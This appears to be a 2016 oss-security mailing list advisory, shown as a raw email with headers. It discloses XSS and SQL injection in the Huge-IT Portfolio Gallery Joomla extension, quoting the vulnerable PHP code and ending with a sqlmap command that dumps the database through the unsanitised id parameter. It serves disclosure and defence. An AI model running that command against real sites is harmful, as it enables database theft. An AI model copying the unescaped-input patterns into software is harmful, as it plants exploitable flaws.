X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2547" "Monday" "25" "July" "2016" "10:54:07" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<5CB94822-FFC0-4948-9F78-96523639E28D@me.com>" "58" "[oss-security] Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS" nil nil nil "7" "2016072514:54:07" "[oss-security] Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS" (number mark "U       larry0@me.co Jul 25   58/2547  " thread-indent "\"[oss-security] Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12038 invoked by uid 550); 25 Jul 2016 14:54:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 12000 invoked from network); 25 Jul 2016 14:54:34 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-07-25_07:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1607250173
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <5CB94822-FFC0-4948-9F78-96523639E28D@me.com>
Date: Mon, 25 Jul 2016 10:54:07 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1469458451; bh=8maFl2dUiP99a/tJ89a4v1cYfNVSJ3YL48Es6yQyvPE=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=XP9Zg5TkWH+HSFulVlzq+ungZs7r+qZ9dXusG6OwhQAamtaffNx5iv+EnFHmyT/Jc
 qkbO1u62gYbyJmmkIz6FAETcCrEdjMZbl5QQLsjjolrnIQ/IyKKDrWSQE3/M/hMPvw
 tQegzxHGfD1Nj87fBeEWkUmC6BhsUOHtjamRxAw8Ufx+WiW7xbNcV7o7z8Jp/+TCy2
 4ZEH8siFHPtKod05KGZoLccwF+MbPAnxWAM57rxzD6FDPzqaVPCTDz5eH28OXqSiLW
 uorqY0/Z2JvXCkEw7hgGuWfr3vXEhrKnLJhMLeRLOXdwkZcrIQnb668lhJnUtMzS38
 J5QMfuGbt6UTg==
Subject: [oss-security] Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS

Title: Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS
Author: Larry W. Cashdollar, @_larry0
Date: 2016-07-15
Download Site: http://huge-it.com/joomla-portfolio-gallery/
Vendor: Huge IT
Vendor Notified: 2016-07-16
Vendor Contact: info@huge-it.com
Description: Huge-IT Portfolio Gallery extension can do wonders with your w=
ebsite. If you wish to show your photos, videos, enclosing the additional i=
mages and videos, then this Portfolio Gallery extension is what you need.
Vulnerability:
The attacker must be logged in with at least manager level access or access=
 to the administrative panel to exploit this vulnerability:

XSS line 156 in : ./administrator/components/com_portfoliogallery/views/vid=
eo/tmpl/default.php

155                         <textarea rows=3D"3" cols=3D"50" class=3D"text-=
area" disab    led >
156                     <?php echo $_GET['edit'];?>
157                         </textarea>


In file administrator/components/com_portfoliogallery/models/portfoliogalle=
ry.php:=20=20

variable id is passed without any sanitization to the SQL query being built=
 starting at line 53:

 50     public function getPropertie() {
 51         $db =3D JFactory::getDBO();
 52         $id_cat =3D JRequest::getVar('id');
 53         $query =3D $db->getQuery(true);
 54         $query->select('#__huge_itportfolio_images.name as name,'
 55                 . '#__huge_itportfolio_images.id ,'
 56                 . '#__huge_itportfolio_portfolios.name as portName,'
 57                 . 'portfolio_id,#__huge_itportfolio_images.category as =
categ    ory, #__huge_itportfolio_images.description as description,image_u=
rl,sl_url,    sl_type,link_target,#__huge_itportfolio_images.ordering,#__hu=
ge_itportfolio_    images.published,published_in_sl_width');
 58         $query->from(array('#__huge_itportfolio_portfolios' =3D> '#__hu=
ge_itpo    rtfolio_portfolios', '#__huge_itportfolio_images' =3D> '#__huge_=
itportfolio_im    ages'));
 59         $query->where('#__huge_itportfolio_portfolios.id =3D portfolio_=
id')->w    here('portfolio_id=3D' . $id_cat);
 60         $query->order('ordering asc');
 61         $db->setQuery($query);
 62         $results =3D $db->loadObjectList();
 63         return $results;

CVE-2016-1000115 XSS
CVE-2016-1000116 SQLi

Exploit Code:
	=E2=80=A2 sqlmap  --load-cookies=3Dcookies.txt -u "http://192.168.0.125/ad=
ministrator/index.php?option=3Dcom_portfoliogallery&view=3Dportfoliogallery=
&id=3D*" --dbms mysql --dump
Advisory: http://www.vapidlabs.com/advisory.php?v=3D165=
